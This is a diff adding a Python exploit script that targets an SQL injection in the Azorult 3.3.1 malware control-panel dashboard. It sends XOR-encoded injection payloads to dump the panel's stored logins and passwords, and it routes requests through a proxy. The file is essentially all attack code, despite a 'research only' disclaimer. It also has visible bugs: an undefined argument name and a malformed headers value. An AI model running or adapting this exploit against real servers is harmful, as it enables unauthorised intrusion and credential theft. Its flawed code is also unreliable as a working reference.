@@ -1,0 +1,95 @@
+import requests
+import argparse
+import base64
+
+# Azorult 3.3.1 C2 SQLi by prsecurity
+# For research purposes only. Don't pwn what you don't own.
+# change GUID and XOR key to specific beacon, can be extracted from a sample
+
+guid = "353E77DF-928B-4941-A631-512662F0785A3061-4E40-BBC2-3A27F641D32B-54FF-44D7-85F3-D950F519F12F353E77DF-928B-4941-A631-512662F0785A3061-4E40-BBC2-3A27F641D32B-54FF-44D7-85F3-D950F519F12F"
+key = "\x03\x55\xae"
+
+def get_args():
+	parser = argparse.ArgumentParser(
+		prog="azorult_sploit.py",
+		formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
+		epilog= '''
+		This script will exploit the SQL vulnerability in Azorult 3.3.1 Dashboard.
+		''')
+	parser.add_argument("target", help="URL of index.php (ex: http://target.com/index.php)")
+	parser.add_argument("-n", "--id_record", default="1", help="id of record to dump")
+	parser.add_argument("-p", "--proxy", default="http://localhost:8080", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = tor)")
+	args = parser.parse_args()
+	return args
+
+def CB_XORm(data, key):
+    j=0
+    key = list(key)
+    data = list(data)
+    tmp = list()
+    for i in range(len(data)):
+        tmp.append(chr(ord(data[i])^ord(key[j])))
+        j += 1
+        if j > (len(key)-1):
+            j = 0
+    return "".join(tmp)
+
+def pwn_target(target, num_records, proxy):
+	requests.packages.urllib3.disable_warnings()
+	proxies = {'http': proxy, 'https': proxy}
+	
+	try:
+		r = requests.get("http://bot.whatismyipaddress.com", proxies=proxies)
+		print("[*] Your IP: {}".format(r.text))
+		headers = {
+			"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+		}
+		print('[+] Getting URL, LOGIN AND PASS')
+		data = [
+		    "|".join([
+		        "1","2","3","4","5","6","7","8","9","10","11","12"
+		    ]),
+		    "\r\n".join([
+		        "|".join(["1","2","3","4"," "*255+"'", ", (select version())), (111,(select * from (select concat({},0x3a,p_p2) from passwords limit {},1) dumb),333,4,5,6,7), (111,(select * from (select concat({},0x3a,p_p3) from passwords limit {},1) dumb),333,4,5,6,7) -- ".format(num_records, num_records,num_records, num_records)])
+		    ]),
+		    "c",
+		    "d",
+		    ":".join(["'11","22"])
+		]
+		payload = CB_XORm(guid.join(data), key)
+		r = requests.post(target, data=payload, headers=headers, verify=False, proxies=proxies)
+		if r.text != "OK":
+			print("[-] ERROR: Something went wrong. Maybe Azorult version is not 3.3.1?")
+			raise
+		print('[+] Getting LOGIN/PASS')
+		data = [
+		    "|".join([
+		        "1","2","3","4","5","6","7","8","9","10","11","12"
+		    ]),
+		    "\r\n".join([
+		        "|".join(["1","2","3","4"," "*255+"'", ", (select version())), (111,(select * from (select concat({},0x3a,p_p1) from passwords limit {},1) dumb),333,4,5,6,7) -- ".format(num_records, num_records)])
+		    ]),
+		    "c",
+		    "d",
+		    ":".join(["'11","22"])
+		]
+		payload = CB_XORm(guid.join(data), key)
+		r = requests.post(target, data=payload, headers=headers, verify=False, proxies=proxies)
+		if r.text != "OK":
+			print("[-] ERROR: Something went wrong. Maybe Azorult version is not 3.3.1?")
+			raise
+		print('[+] If this worked, you will see two new records in password table at guest.php')
+	except:
+		print("[-] ERROR: Something went wrong.")
+		print(r.text)
+		raise
+
+def main():
+	print ()
+	print ('Azorult 3.3.1 SQLi by prsecurity')
+	args = get_args()
+	pwn_target(args.target.strip(), args.num_records.strip(), args.proxy.strip())
+
+
+if __name__ == '__main__':
+	main()
